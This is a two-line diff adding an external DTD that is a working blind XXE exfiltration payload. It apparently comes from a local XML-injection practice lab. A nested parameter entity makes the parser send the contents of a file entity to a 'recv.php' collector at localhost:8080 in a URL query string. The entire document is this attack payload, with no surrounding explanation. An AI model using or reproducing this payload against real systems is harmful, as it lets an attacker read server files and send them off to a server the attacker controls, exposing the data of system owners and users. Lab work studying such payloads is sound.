@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://localhost:8080/Sheep/xmlInjection/recv.php?data=%file;'>">
+%all;
